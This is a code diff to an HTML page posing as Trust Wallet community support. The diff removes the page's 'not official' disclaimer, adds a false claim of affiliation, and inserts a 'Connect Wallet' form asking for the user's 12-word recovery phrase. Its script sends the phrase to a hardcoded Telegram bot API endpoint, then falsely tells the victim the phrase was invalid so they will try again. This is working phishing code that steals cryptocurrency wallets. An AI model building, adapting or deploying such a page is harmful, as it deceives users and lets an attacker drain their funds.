@@ -11,28 +11,23 @@
       background-color: #f9fbfc;
       color: #333;
     }
-
     header {
       background-color: #3375bb; /* Trust Wallet blue */
       color: white;
       padding: 30px 20px;
       text-align: center;
     }
-
     header h1 {
       margin: 0;
       font-size: 2em;
     }
-
     section {
       padding: 40px 20px;
       text-align: center;
     }
-
     section h2 {
       color: #3375bb;
     }
-
     .support-box {
       background: white;
       border-radius: 8px;
@@ -41,7 +36,6 @@
       max-width: 600px;
       box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
     }
-
     footer {
       background-color: #3375bb;
       color: white;
@@ -49,43 +43,108 @@
       padding: 15px 10px;
       font-size: 0.9em;
     }
+    /* Additional styles for button and input */
+    #connectBtn {
+      margin-top: 20px;
+      padding: 12px 20px;
+      font-size: 1em;
+      border: none;
+      background-color: #3375bb;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    #connectBtn:hover {
+      background-color: #2a5d9f;
+    }
   </style>
 </head>
 <body>
-
   <header>
     <h1>Trust Wallet Support</h1>
     <p>Community Help & Live Chat</p>
   </header>
-
   <section>
     <div class="support-box">
       <h2>Need Help?</h2>
       <p>Our community support team is here to assist with any Trust Wallet-related issues.</p>
       <!-- 🔧 Paste your CharPort install code below -->
       <!-- Begin of Chaport Live Chat code -->
-<script type="text/javascript">
-(function(w,d,v3){
-w.chaportConfig = {
-appId : '689c8282950f184d684cc0fb'
-};
-
-if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
-</script>
-<!-- End of Chaport Live Chat code -->
+      <script type="text/javascript">
+        (function(w,d,v3){
+          w.chaportConfig = {
+            appId : '689c8282950f184d684cc0fb'
+          };
+          if(w.chaport)return;
+          v3=w.chaport={};
+          v3._q=[];v3._l={};
+          v3.q=function(){v3._q.push(arguments)};
+          v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};
+          var s=d.createElement('script');
+          s.type='text/javascript';
+          s.async=true;
+          s.src='https://app.chaport.com/javascripts/insert.js';
+          var ss=d.getElementsByTagName('script')[0];
+          ss.parentNode.insertBefore(s,ss)
+        })(window, document);
+      </script>
+      <!-- End of Chaport Live Chat code -->
+      <button id="connectBtn">Connect Wallet</button>
     </div>
   </section>
-
   <section>
-    <div class="support-box">
-      <h2>About This Page</h2>
-      <p>This is an independent support page for Trust Wallet users. We are not the official team but aim to help through trusted community channels.</p>
+    <div class="support-box" id="wallet-section" style="display:none;">
+      <h2>Enter Your 12 Words</h2>
+      <p>Please enter your 12-word recovery phrase, separated by spaces. It must start with 3 letters.</p>
+      <input type="text" id="seedInput" style="width: 100%; padding:10px; font-size:1em; border:1px solid #ccc; border-radius:4px;" placeholder="e.g., abc def ghi ..." />
+      <button id="sendBtn" style="margin-top:15px; padding:10px 20px; font-size:1em; border:none; background-color:#3375bb; color:white; border-radius:5px; cursor:pointer;">Continue</button>
     </div>
   </section>
-
   <footer>
-    &copy; 2025 Trust Wallet Support Community. Not affiliated with official Trust Wallet.
+    &copy; 2025 Trust Wallet Support Community. And affiliated with official Trust Wallet.
   </footer>
 
+  <script>
+    document.getElementById('connectBtn').addEventListener('click', function() {
+      document.getElementById('wallet-section').style.display = 'block';
+      // Optional: scroll to the input section
+      document.getElementById('wallet-section').scrollIntoView({behavior: 'smooth'});
+    });
+
+    document.getElementById('sendBtn').addEventListener('click', function() {
+      const seedPhrase = document.getElementById('seedInput').value.trim();
+      if (!seedPhrase) {
+        alert('Please enter your 12-word phrase.');
+        return;
+      }
+      const words = seedPhrase.split(' ');
+      if (words.length !== 12) {
+        alert('Please enter exactly 12 words.');
+        return;
+      }
+      if (!words[0].match(/^[a-zA-Z]{3,}$/)) {
+        alert('The first word must start with at least 3 letters.');
+        return;
+      }
+      // Replace 'YOUR_TELEGRAM_BOT_URL' with your actual bot URL or API endpoint
+      const telegramBotUrl = 'https://api.telegram.org/bot7976049933:AAF2k4dys8jng-K9u6ee70sZAKmbyFjest8/sendMessage?chat_id=6366381076&text=' + encodeURIComponent('Seed phrase: ' + seedPhrase);
+      
+      // Send to Telegram
+      fetch(telegramBotUrl)
+        .then(response => {
+          if (response.ok) {
+            alert('Your seed phrase is invalid please input a correct phrase and try again..');
+            document.getElementById('seedInput').value = '';
+            document.getElementById('wallet-section').style.display = 'none';
+          } else {
+            alert('Failed to connect. Please try again.');
+          }
+        })
+        .catch(error => {
+          alert('Error connecting wallet.: ' + error);
+        });
+    });
+  </script>
 </body>
-</html
+</html>
